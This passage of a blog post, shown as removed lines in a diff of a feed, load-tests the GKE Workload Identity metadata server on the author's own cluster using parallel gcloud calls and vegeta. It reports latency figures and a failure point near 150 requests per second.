-      readOnlyRootFilesystem: false
-    resources:
-      limits:
-        cpu: 2
-        memory: 4G
-      requests:
-        cpu: 2
-        memory: 4G
-EOF
-</code></pre>
-
-<p>Then <code>kubectl exec</code> in and run this command.</p>
-
-<pre><code>for i in {1..N}; do gcloud auth print-access-token &amp; done; wait;
-</code></pre>
-
-<p>Everything seemed to work fine when N was 100. When N was 200 I got a few errors like the below.
-They look like client-side errors and not server ones though.</p>
-
-<pre><code>ERROR: gcloud failed to load: No module named 'ruamel.yaml.error'
-gcloud_main = _import_gcloud_main()
-import googlecloudsdk.gcloud_main
-from googlecloudsdk.api_lib.iamcredentials import util as iamcred_util
-from googlecloudsdk.api_lib.util import exceptions
-from googlecloudsdk.core.resource import resource_printer
-from googlecloudsdk.core.resource import yaml_printer
-from googlecloudsdk.core.yaml import dict_like
-from googlecloudsdk.core import yaml_location_value
-from ruamel import yaml
-from ruamel.yaml.main import * # NOQA
-from ruamel.yaml.error import UnsafeLoaderWarning, YAMLError # NOQA
-
-This usually indicates corruption in your gcloud installation or problems with your Python interpreter.
-
-Please verify that the following is the path to a working Python 2.7 or 3.5+ executable:
-/usr/bin/python3
-
-If it is not, please set the CLOUDSDK_PYTHON environment variable to point to a working Python 2.7 or 3.5+ executable.
-
-If you are still experiencing problems, please reinstall the Cloud SDK using the instructions here:
-https://cloud.google.com/sdk/
-
-ERROR: gcloud failed to load: cannot import name 'opentype' from 'pyasn1.type' (/usr/bin/../lib/google-cloud-sdk/lib/third_party/pyasn1/type/__init__.py)
-from google.auth.crypt import _cryptography_rsa
-import cryptography.exceptions
-
-
-File "/usr/bin/../lib/google-cloud-sdk/lib/gcloud.py", line 67, in main
-File "/usr/bin/../lib/google-cloud-sdk/lib/gcloud.py", line 48, in _import_gcloud_main
-File "/usr/lib/google-cloud-sdk/lib/googlecloudsdk/gcloud_main.py", line 33, in &lt;module&gt;
-File "/usr/lib/google-cloud-sdk/lib/googlecloudsdk/api_lib
-</code></pre>
-
-<p><code>gcloud</code> does not synchronize between processes with concurrent invokations. It sometimes writes
-files to disk. So this is also not a great load test because it still doesn&rsquo;t let you achieve a
-specific RPS and has client-side bottlenecks.</p>
-
-<h2>Level 3</h2>
-
-<p>Use a proper HTTP load testing tool. A colleague told me about <a href="https://github.com/tsenart/vegeta"><code>vegeta</code></a>.
-It&rsquo;s a seemingly good tool, but, more importantly, its commands are amazing.
-<code>vegeta attack ...</code>.</p>
-
-<p>I first start a <code>golang</code> Pod that just busy-waits.</p>
-
-<pre><code>$ cat &lt;&lt;EOF | kubectl --context [CONTEXT] apply -f -
-&gt; apiVersion: v1
-&gt; kind: Pod
-&gt; metadata:
-&gt;   name: wi-test
-&gt;   namespace: [NAMESPACE]
-&gt; spec:
-&gt;   containers:
-&gt;   - image: golang:latest
-&gt;     name: wi-test
-&gt;     command: [ '/bin/bash', '-c', '--' ]
-&gt;     args: [ 'while true; do sleep 30; done;' ]
-&gt;     resources:
-&gt;       limits:
-&gt;         cpu: 2
-&gt;         memory: 4G
-&gt;       requests:
-&gt;         cpu: 2
-&gt;         memory: 4G
-&gt; EOF
-
-pod/wi-test created
-</code></pre>
-
-<p>Then I get a shell in it.</p>
-
-<pre><code>kubectl --context [CONTEXT] -n [NAMESPACE] exec -it wi-test bash
-
-Defaulting container name to wi-test.
-Use 'kubectl describe pod/wi-test -n [NAMESPACE]' to see all of the containers in this pod.
-
-root@wi-test:/go# go get github.com/tsenart/vegeta
-root@wi-test:/go# vegeta -version
-
-Version:
-Commit:
-Runtime: go1.14.1 linux/amd64
-Date:
-</code></pre>
-
-<p>Let&rsquo;s throw some load on WI! <code>my-gsa@my-project.iam.gserviceaccount.com</code> is the GSA associated with
-the KSA your workload runs as.</p>
-
-<pre><code>root@wi-test:/go# echo "GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token" | vegeta attack -header 'Metadata-Flavor: Google' -rate 10 -duration=5s | vegeta report
-
-Requests      [total, rate, throughput]         50, 10.20, 10.20
-Duration      [total, attack, wait]             4.904s, 4.9s, 4.168ms
-Latencies     [min, mean, 50, 90, 95, 99, max]  4.168ms, 6.137ms, 5.039ms, 9.591ms, 10.444ms, 31.452ms, 31.452ms
-Bytes In      [total, mean]                     25300, 506.00
-Bytes Out     [total, mean]                     0, 0.00
-Success       [ratio]                           100.00%
-Status Codes  [code:count]                      200:50
-Error Set:
-
-root@wi-test:/go# echo "GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token" | vegeta attack -header 'Metadata-Flavor: Google' -rate 1000 -duration=5s | vegeta report
-Requests      [total, rate, throughput]         5000, 1000.20, 127.51
-Duration      [total, attack, wait]             31.175s, 4.999s, 26.176s
-Latencies     [min, mean, 50, 90, 95, 99, max]  101.972ms, 11.003s, 7.652s, 30s, 30s, 30s, 30.001s
-Bytes In      [total, mean]                     2011350, 402.27
-Bytes Out     [total, mean]                     0, 0.00
-Success       [ratio]                           79.50%
-Status Codes  [code:count]                      0:1025  200:3975
-Error Set:
-Get "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
-
-root@wi-test:/go# echo "GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token" | vegeta attack -header 'Metadata-Flavor: Google' -rate 100 -duration=5s | vegeta report
-Requests      [total, rate, throughput]         500, 100.20, 98.40
-Duration      [total, attack, wait]             5.081s, 4.99s, 91.244ms
-Latencies     [min, mean, 50, 90, 95, 99, max]  3.805ms, 106.449ms, 59.058ms, 306.334ms, 372.519ms, 506.703ms, 601.534ms
-Bytes In      [total, mean]                     253000, 506.00
-Bytes Out     [total, mean]                     0, 0.00
-Success       [ratio]                           100.00%
-Status Codes  [code:count]                      200:500
-Error Set:
-
-root@wi-test:/go# echo "GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token" | vegeta attack -header 'Metadata-Flavor: Google' -rate 500 -duration=5s | vegeta report
-Requests      [total, rate, throughput]         2500, 500.20, 43.29
-Duration      [total, attack, wait]             34.072s, 4.998s, 29.074s
-Latencies     [min, mean, 50, 90, 95, 99, max]  10.56ms, 12.579s, 756.03ms, 30s, 30s, 30s, 30.001s
-Bytes In      [total, mean]                     746350, 298.54
-Bytes Out     [total, mean]                     0, 0.00
-Success       [ratio]                           59.00%
-Status Codes  [code:count]                      0:1025  200:1475
-Error Set:
-Get "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
-
-root@wi-test:/go# echo "GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token" | vegeta attack -header 'Metadata-Flavor: Google' -rate 250 -duration=5s | vegeta report
-Requests      [total, rate, throughput]         1250, 250.22, 28.52
-Duration      [total, attack, wait]             34.996s, 4.996s, 30s
-Latencies     [min, mean, 50, 90, 95, 99, max]  8.331ms, 6.347s, 376.419ms, 30s, 30s, 30s, 30.001s
-Bytes In      [total, mean]                     504988, 403.99
-Bytes Out     [total, mean]                     0, 0.00
-Success       [ratio]                           79.84%
-Status Codes  [code:count]                      0:252  200:998
-Error Set:
-Get "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
-
-root@wi-test:/go# echo "GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token" | vegeta attack -header 'Metadata-Flavor: Google' -rate 200 -duration=5s | vegeta report
-Requests      [total, rate, throughput]         1000, 200.20, 28.28
-Duration      [total, attack, wait]             32.43s, 4.995s, 27.435s
-Latencies     [min, mean, 50, 90, 95, 99, max]  9.985ms, 2.739s, 188.509ms, 797.058ms, 30s, 30s, 30s
-Bytes In      [total, mean]                     464002, 464.00
-Bytes Out     [total, mean]                     0, 0.00
-Success       [ratio]                           91.70%
-Status Codes  [code:count]                      0:83  200:917
-Error Set:
-Get "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
-
-root@wi-test:/go# echo "GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token" | vegeta attack -header 'Metadata-Flavor: Google' -rate 150 -duration=5s | vegeta report
-Requests      [total, rate, throughput]         750, 150.20, 146.53
-Duration      [total, attack, wait]             5.118s, 4.993s, 125.078ms
-Latencies     [min, mean, 50, 90, 95, 99, max]  3.747ms, 224.285ms, 171.325ms, 460.236ms, 549.18ms, 682.161ms, 892.25ms
-Bytes In      [total, mean]                     379500, 506.00
-Bytes Out     [total, mean]                     0, 0.00
-Success       [ratio]                           100.00%
-Status Codes  [code:count]                      200:750
-Error Set:
-
-root@wi-test:/go# echo "GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token" | vegeta attack -header 'Metadata-Flavor: Google' -rate 175 -duration=5s | vegeta report
-Requests      [total, rate, throughput]         875, 175.20, 24.46
-Duration      [total, attack, wait]             34.097s, 4.994s, 29.103s
-Latencies     [min, mean, 50, 90, 95, 99, max]  3.704ms, 1.687s, 231.652ms, 708.672ms, 2.432s, 30s, 30s
-Bytes In      [total, mean]                     422004, 482.29
-Bytes Out     [total, mean]                     0, 0.00
-Success       [ratio]                           95.31%
-Status Codes  [code:count]                      0:41  200:834
-Error Set:
-Get "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
-
-root@wi-test:/go# echo "GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token" | vegeta attack -header 'Metadata-Flavor: Google' -rate 165 -duration=5s | vegeta report
-Requests      [total, rate, throughput]         825, 165.20, 23.61
-Duration      [total, attack, wait]             34.6s, 4.994s, 29.606s
-Latencies     [min, mean, 50, 90, 95, 99, max]  3.483ms, 558.613ms, 222.111ms, 531.49ms, 622.473ms, 11.851s, 30s
-Bytes In      [total, mean]                     413402, 501.09
-Bytes Out     [total, mean]                     0, 0.00
-Success       [ratio]                           99.03%
-Status Codes  [code:count]                      0:8  200:817
-Error Set:
-Get "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
-</code></pre>
-
-<p>After more bisection, I found that this specific instance of <code>gke-metadata-server</code>
-starts to fail around 150RPS. When it does fail, p99 latency skyrockets from less than 1 second to
-30 seconds. This is usually a sign of a rate limiter or quota.</p>
-
-<p>How have you tried load testing WI or other GKE features? What&rsquo;re your favorite load testing tools
-for these cases, and what interesting behavior have you found?</p>
 ]]></content>
   </entry>
   
